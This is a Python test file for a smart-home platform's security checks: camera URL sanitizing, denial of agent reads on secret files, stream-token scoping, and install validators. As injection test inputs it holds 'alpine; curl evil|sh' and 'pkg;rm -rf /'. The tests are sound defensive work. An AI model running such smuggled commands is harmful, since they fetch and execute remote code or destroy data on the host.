import pytest

from addons.install_validate import validate_apt_packages, validate_docker_image
from core import auth
from core.cameras.public_attrs import sanitize_camera_attributes, sanitize_entity_for_client
from core.security_paths import is_denied_agent_read_path


def test_sanitize_camera_attributes_strips_rtsp_and_internal_urls():
    attrs = {
        "rtsp_url": "rtsp://user:secret@192.168.1.10:554/stream1",
        "snapshot_url": "http://192.168.1.10:8971/api/cam/latest.jpg",
        "go2rtc_stream": "front_door",
        "live_providers": ["rtsp", "webm", "snapshot"],
    }
    out = sanitize_camera_attributes(attrs)

    assert "rtsp_url" not in out
    assert "snapshot_url" not in out
    assert out["go2rtc_stream"] == "front_door"
    assert out["live_providers"] == ["rtsp", "webm", "snapshot"]


def test_sanitize_entity_for_client():
    entity = {
        "entity_id": "camera.front",
        "attributes": {"rtsp_url": "rtsp://x", "friendly_name": "Front"},
    }
    out = sanitize_entity_for_client(entity)

    assert "rtsp_url" not in out["attributes"]
    assert out["attributes"]["friendly_name"] == "Front"


def test_file_read_denies_secrets_paths():
    assert is_denied_agent_read_path(".env")
    assert is_denied_agent_read_path("config.json")
    assert is_denied_agent_read_path("secrets/integration_entries.key")
    assert is_denied_agent_read_path("core/.secret_key")
    assert not is_denied_agent_read_path("README.md")


def test_camera_stream_token_entity_scope():
    scoped = auth.create_camera_stream_token("alice", "camera.front")
    other = auth.create_camera_stream_token("alice", "camera.back")

    scoped_payload = auth.verify_camera_stream_token(scoped)
    assert scoped_payload["entity_id"] == "camera.front"
    assert auth.verify_camera_stream_token(other)["entity_id"] == "camera.back"
    with pytest.raises(ValueError):
        auth.create_camera_stream_token("alice", "")


def test_media_proxy_token_type():
    token = auth.create_media_proxy_token("alice")
    payload = auth.verify_media_proxy_token(token)
    assert payload is not None
    assert payload["type"] == "media_proxy"
    assert auth.verify_camera_stream_token(token) is None


def test_docker_install_rejects_shell_injection():
    with pytest.raises(ValueError):
        validate_docker_image("alpine; curl evil|sh")

    assert validate_docker_image("library/nginx:1.27") == "library/nginx:1.27"


def test_apt_packages_reject_shell_metacharacters():
    assert validate_apt_packages(["mosquitto-clients"]) == ["mosquitto-clients"]
    with pytest.raises(ValueError):
        validate_apt_packages(["pkg;rm -rf /"])
